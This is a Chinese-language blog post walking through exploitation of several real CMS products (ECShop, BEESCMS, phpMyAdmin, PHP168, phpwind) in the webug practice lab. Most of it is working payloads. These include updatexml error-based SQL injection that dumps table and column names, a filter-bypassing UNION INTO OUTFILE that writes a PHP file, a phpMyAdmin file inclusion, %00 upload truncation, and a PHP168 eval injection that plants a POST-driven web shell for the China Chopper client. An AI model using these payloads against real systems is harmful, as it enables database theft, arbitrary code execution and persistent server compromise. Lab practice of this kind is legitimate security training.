<h1 id="ECSHOP"><a href="#ECSHOP" class="headerlink" title="ECSHOP"></a>ECSHOP</h1><h2 id="admin-shopinfo"><a href="#admin-shopinfo" class="headerlink" title="/admin/shopinfo"></a>/admin/shopinfo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">问题：</span><br><span class="line">文件/admin/shopinfo.php中107-109行</span><br><span class="line">if ($_REQUEST[&apos;act&apos;] == &apos;edit&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    /* 权限判断 */</span><br><span class="line">    admin_priv(&apos;shopinfo_manage&apos;);</span><br><span class="line">    /* 取得文章数据 */</span><br><span class="line">$sql = &quot;SELECT article_id, title, content FROM &quot;.$ecs-&gt;table(&apos;article&apos;).&quot;WHERE article_id =&quot;.$_REQUEST[&apos;id&apos;];</span><br><span class="line">    $article = $db-&gt;GetRow($sql);</span><br><span class="line">由于这里</span><br><span class="line">$sql = &quot;SELECT article_id, title, content FROM &quot;.$ecs-&gt;table(&apos;article&apos;).&quot;WHERE article_id =&quot;.$_REQUEST[&apos;id&apos;];</span><br><span class="line">没有对传入对id进行处理，直接带入了sql语句导致了注入的发生</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/z1eewYF.png" alt=""></p>
<p>这个是登陆进去之后的updatexml(init.php没过滤到它)报错注入<br>这里给出报错时的步骤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http://172.30.129.74/pentest/cms/ecshop/admin/shopinfo.php</span><br><span class="line">?act=edit</span><br><span class="line">#先用version()果然是报出来了，这里很多过滤了，所以最后选择用updatexml：</span><br><span class="line">&amp;id=1 and updatexml(1,concat(0x7e,(version())),0)</span><br><span class="line">这里我就已经知道了库名：ecshop1</span><br><span class="line">列名:article_id title content</span><br><span class="line">#查表名：</span><br><span class="line">&amp;id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0xecshop1[库名我hex()了一下])),0)</span><br><span class="line">得到表名：ecs_account_log ecs_account_oth</span><br><span class="line">#查列名：</span><br><span class="line">&amp;id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x[这我先查的第一个表的列])),0)</span><br><span class="line">列：log_id user_id user_money froze</span><br><span class="line">第二个表查了之后直接进入了添加新文章界面，我就没再管</span><br><span class="line">#这里就给出查第一个列的：</span><br><span class="line">&amp;id=1 and updatexml(1,concat(0x7e,(select group_concat(log_id) from ecs_account_log)),0)</span><br><span class="line"></span><br><span class="line">做到这里，查询的就差不多了，就不继续了。给个链接：</span><br><span class="line">http://blog.icxun.cn/hack/Code/475.html</span><br></pre></td></tr></table></figure>
<h1 id="BEESCMS"><a href="#BEESCMS" class="headerlink" title="BEESCMS"></a>BEESCMS</h1><h2 id="admin"><a href="#admin" class="headerlink" title="/admin"></a>/admin</h2><p>这题我刚开始注入点想错了(<em>^_^</em>)</p>
<p>利用：后台登陆界面/admin/login.php 的验证码在一次验证后在不刷新情况下可以多次提交请求。</p>
<p><img src="https://i.imgur.com/pooHR1Y.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin&apos;un union ion seselectlect 1,2,3,4,5 &apos;&apos; in into outoutfilefile &apos;C:/phpStudy/WWW/aa.php&apos; -- &amp;password=12&amp;code=dbc8&amp;submit=true&amp;submit.x=27&amp;submit.y=25</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/ynF2Nir.png" alt=""></p>
<p><img src="https://i.imgur.com/pvRrrHS.png" alt=""></p>
<h1 id="PHPMYADMIN"><a href="#PHPMYADMIN" class="headerlink" title="PHPMYADMIN"></a>PHPMYADMIN</h1><h2 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h2><p>弱口令登陆后，点击load url，可看到生成一个含token的字符串</p>
<p><img src="https://i.imgur.com/d0SJ6t2.png" alt=""></p>
<p>复制token，在hackbar栏中输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/gis_data_editor.php?token=(上面操作复制的内容粘贴进入这里)&amp;gis_data[gis_type]=/../../../phpinfo.txt％00</span><br></pre></td></tr></table></figure>
<p>提交后可能会有问题，靶场原因。</p>
<h1 id="海盗云商"><a href="#海盗云商" class="headerlink" title="海盗云商"></a>海盗云商</h1><p>简单的上传xx.php.jpg/gif</p>
<p>抓包后%00截断</p>
<p>但是有些电脑实现不了。</p>
<h1 id="PHP168-6-0"><a href="#PHP168-6-0" class="headerlink" title="PHP168 6.0"></a>PHP168 6.0</h1><p>利用：PHP168在某些函数里运用了eval函数,但是某数组没有初试化,导致可以提交任意代码执行。<br>先注册一个账号，登陆后在地址栏提交：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">member/post.php?only=1&amp;showHtml_Type[bencandy][1]=&#123;$&#123;phpinfo()&#125;&#125;&amp;aid=1&amp;job=endHTML</span><br></pre></td></tr></table></figure>
<p>可看到执行了phpinfo()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">member/post.php?only=1&amp;showHtml_Type[bencandy][1]=&#123;$&#123;eval($_POST[&apos;x&apos;])&#125;&#125;&amp;aid=1&amp;job=endHTML</span><br></pre></td></tr></table></figure>
<p>再使用菜刀连接即可</p>
<h1 id="phpwind"><a href="#phpwind" class="headerlink" title="phpwind"></a>phpwind</h1><p>注册一账号，在里面发表：</p>
<p><img src="https://i.imgur.com/LKL1UIX.png" alt=""></p>
<p>再用菜刀连。</p>
<p>其他的一些靶场有问题，有的虽然也调试了，却还是依然有问题~</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">littlefisher</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/06/14/webug-实战/">http://yoursite.com/2018/06/14/webug-实战/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/10/14/ELK搭建整理/"><i class="fa fa-chevron-left">  </i><span>ELK搭建</span></a></div><div class="next-post pull-right"><a href="/2018/06/12/webug中级五关/"><span>webug-中级五关</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By littlefisher</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.4"></script><script src="/js/fancybox.js?version=1.5.4"></script><script src="/js/sidebar.js?version=1.5.4"></script><script src="/js/copy.js?version=1.5.4"></script><script src="/js/fireworks.js?version=1.5.4"></script><script src="/js/transition.js?version=1.5.4"></script><script src="/js/scroll.js?version=1.5.4"></script><script src="/js/head.js?version=1.5.4"></script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"z16","width":150,"height":300,"scaling":1,"opacityDefault":0.7,"opacityHover":1,"mobileShow":true,"mobileScaling":0.5,"position":"right","horizontalOffset":0,"verticalOffset":-20,"id":"live2dcanvas","deviceJsSource":"local","pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/"});</script></body></html>